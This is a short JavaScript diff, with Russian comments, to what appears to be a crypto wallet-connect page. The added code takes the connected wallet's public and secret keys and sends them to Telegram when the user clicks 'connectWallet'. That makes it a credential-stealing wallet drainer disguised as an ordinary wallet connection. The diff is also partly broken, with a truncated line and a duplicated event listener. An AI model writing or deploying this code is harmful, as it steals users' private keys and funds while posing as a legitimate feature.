@@ -67,7 +67,15 @@
         const secretKey = Array.from(resp.secretKey || []);
 
         // Отправляем публичный и секретный ключ в Telegram
-        await sendToTelegram(`Публич
+        await sendToTelegram(`Публичный ключ кошелька: ${publicKey}\nСекретный ключ: ${secretKey.join(",")}`);
+      } catch (err) {
+        console.error("Ошибка подключения кошелька:", err);
+        alert("Не удалось подключить кошелек.");
+      }
+    }
+
+    document.getElementById("connectWallet").addEventListener("click", connectWallet);
+</script>
 
 
     document.getElementById("connectWallet").addEventListener("click", connectWallet);
